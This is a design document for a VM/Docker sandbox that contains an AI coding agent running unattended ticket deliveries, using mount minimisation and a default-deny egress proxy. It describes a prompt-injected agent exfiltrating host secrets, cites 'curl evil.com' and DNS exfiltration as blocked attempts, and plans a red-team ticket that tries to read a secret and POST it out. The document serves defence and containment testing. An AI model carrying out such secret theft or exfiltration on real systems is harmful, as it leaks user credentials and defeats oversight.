# VM sandbox provider — design (the second execution mode)

Status: **P0 built + validated (docker provider); live-delivery capstone (step 5) +
true-microVM (`lima`) pending.** Fills the `docker` case in `runner/lib/sandbox.sh`'s
`sandbox_wrap_cmd` provider seam (`lima` remains a stub). Addresses the external
security review's #1 ("no real exfiltration boundary — read + network") — the item no
amount of regex/hook hardening can close.

**Built so far** (`SANDBOX_PROVIDER=docker`): the seam `docker` case → `lib/sandbox-docker.sh`
wrapper (path-mirrored mounts, `--internal` network, allowlist-proxy env, credential
scrub) + the `runner/sandbox/egress-proxy` allowlist proxy + a red-team acceptance test
(`runner/test/sandbox-docker-containment.test.sh`). **Verified on real Docker:** host
secret unreadable (not mounted), egress to a non-allowlisted host blocked (DNS *and*
raw-IP), allowlisted model + registry reachable, worktree writable and round-tripping.
Not yet done: the delivery **image** (node + `claude`) and a live `claude -p` delivery
end-to-end inside the container (step 5), plus the per-ticket **microVM** upgrade.

## Two modes (the framing)

Gaffer offers exactly **two execution postures**, and the operator chooses per the
trust level of the input:

| | **Mode 1 — current (write sandbox)** | **Mode 2 — VM sandbox (new)** |
|---|---|---|
| Boundary | throwaway worktree + deterministic safety hook + *optional* `sandbox-exec` write scoping | a real **VM**: own kernel, own filesystem, own network namespace |
| Writes | scoped to the worktree | physically cannot escape the guest |
| **Reads** | agent can read anything the OS user can | **only what is mounted in** (the repo + runtime state) |
| **Network egress** | unrestricted (`claude` needs the network; we wrap the whole process) | **allowlist only** (model endpoint + package registries) via a host-controlled proxy |
| Host creds / home | on the box, hook-guarded, same-UID reachable | **not present in the guest** |
| Good for | trusted repos, human on the gate (supervised/graduated) | **unattended + untrusted** — the posture autonomy actually needs |
| Selector | `SANDBOX_PROVIDER=sandbox-exec` (default) | `SANDBOX_PROVIDER=vm` |

Mode 1 is honest but limited: it is a *write* sandbox (see `STRICT_MODE.md`). Mode 2
is the boundary a determined or prompt-injected agent is actually contained by. This
composes with the just-landed rule that **any autonomy flag auto-requires an OS
sandbox** — the intended safe unattended config becomes `GAFFER_MODE=autonomous` (or
the flags) **+ `SANDBOX_PROVIDER=vm`**, and the runner fails closed if the VM can't
come up.

## Why a VM, not a container

`sandbox-exec` wraps the *whole* `claude -p` process, so it cannot isolate network
per-subprocess (documented caveat). A container could, but shares the host kernel and
the daemon is another attack surface. A **VM** gives the cleanest story for the threat
we care about — *read host data → encode → send it out*: the guest simply has no host
filesystem and no route to the internet except the allowlist. On macOS this is Lima
(Apple Virtualization / `vz`, or QEMU); on Linux, QEMU / cloud-hypervisor / Firecracker.

## The key enabler: the data plane already works against copies

`runner/.mcp.json` wires **stdio** MCP servers (`dispatch`, `memory`) as child
processes of `claude`, pointed at **runtime DB _copies_** (`${DISPATCH_DB}` /
`${MEMORY_DB}`) plus a runner-held `${GAFFER_CLAIM_TOKEN}`. The runner already
reconciles those copies back to the canonical DBs after delivery. Consequence for the
VM: **the whole MCP data plane runs *inside* the guest** (node + the dist bins + the
DB copies) — there is **no need to forward a live host MCP socket into the VM**. The
runner syncs artifacts in/out at the boundaries it already owns:

```
host: copy worktree + DB copies + dist bins + skills + hook  ──►  guest (mounted RO/RW as appropriate)
guest: claude -p → spawns dispatch/memory MCP (stdio) → writes evidence to the DB copies + commits to the worktree
host: read the worktree branch + DB copies back  ──►  reconcile + review gate (unchanged)
```

## How it plugs into the seam

`sandbox_wrap_cmd` echoes a **command prefix** prepended to `claude -p …`. The `vm`
case echoes a wrapper (`runner/lib/vm-exec.sh` / a small bin) that:

1. ensures a warm guest is up (pool of 1+ ephemeral guests; cold-boot fallback),
2. mounts **only**: the target repo/worktree (RW), `$GAFFER_DATA` runtime copies (RW),
   the built `dist` bins + `runner/skills` + `safety-hook.mjs` (RO),
3. injects **only** `ANTHROPIC_API_KEY` (nothing else — the env is already `env -i`
   allowlisted; the VM enforces it structurally),
4. execs the wrapped `claude -p …` inside the guest with the translated cwd (worktree),
5. tears the guest down (or returns it to the pool, wiped).

Nothing else in `tick.sh` / config / the profile generator changes — that is the whole
point of the seam. `GAFFER_STRICT_REQUIRE=1` already fails closed if the provider can't
supply containment, so a VM that won't boot refuses the run rather than silently
degrading.

## Egress allowlist (the differentiator)

The guest's only network path is a host-side proxy that permits **only**:
`api.anthropic.com` (model), and the package registries a delivery legitimately needs
(`registry.npmjs.org`, `pypi.org`, … — configurable, default-deny). Everything else is
refused. Because the guest has no other route, `curl evil.com` and DNS-exfil both fail
at the network layer, not at a string check. `--ignore-scripts` on installs still
applies inside.

## MVP → phased

- **P0 — spike (prove it runs).** One `vm` provider (Lima on macOS / QEMU on Linux),
  one real ticket delivered end-to-end *inside* the guest, worktree + evidence synced
  back, review gate unchanged. Egress still open. Goal: the seam + sync loop works.
- **P1 — egress allowlist.** Host proxy, default-deny, model + registries only. Prove
  a delivery that needs `npm ci` still works; prove `curl` to anything else fails.
- **P2 — mount minimisation + red-team.** Confirm the guest sees *only* the repo +
  runtime copies (no `$HOME`, `~/.ssh`, `~/.aws`, sibling repos, canonical DBs). Ship a
  **red-team ticket** as a standing test: a prompt-injected brief that tries to read a
  host secret and POST it out **must fail at both the read (not mounted) and the egress
  (denied)** — this is the acceptance gate for calling Mode 2 real.
- **P3 — lifecycle / performance.** Guest pool + warm-boot (cold VM per ticket is too
  slow), image build/caching, teardown-wipe, resource caps, CI matrix.

## Acceptance criteria (what makes Mode 2 "done")

1. A ticket delivers to `done` end-to-end with `SANDBOX_PROVIDER=vm`, review gate intact.
2. The red-team ticket (read-secret + exfil) **fails closed** — verified, in CI.
3. `GAFFER_MODE=autonomous` + `SANDBOX_PROVIDER=vm` runs unattended; the same config
   **without** the VM refuses to launch (already true via strict-require).
4. Honest docs: `STRICT_MODE.md` + `SECURITY.md` updated to describe Mode 2 as the
   read+egress boundary, Mode 1 as the write sandbox.

## Constraints / open questions

- **Cannot be validated on the current dev machine** — Docker/VMs don't boot here
  (Homebrew-Postgres fallback is in use for the same reason). P0 needs a
  virtualization-capable host or CI runner.
- Boot latency: cold VM per ticket is likely 10–30s+; a warm pool is probably required
  before this is usable at throughput (P3, but design the pool seam in P0).
- Registry allowlist breadth: monorepos pull from many registries; the default-deny
  list needs a sane, documented, per-repo-overridable default.
- Worktree/object-DB sharing: today the worktree shares the host repo object DB; in the
  guest it must be a self-contained clone or a mounted repo — decide in P0 (mount the
  repo RW is simplest; clone-in is cleaner isolation).
- macOS vs Linux provider parity: one `vm` case or two (`lima` / `qemu`)? Prefer one
  `vm` case that auto-selects the backend, mirroring how `sandbox-exec` hides SBPL.
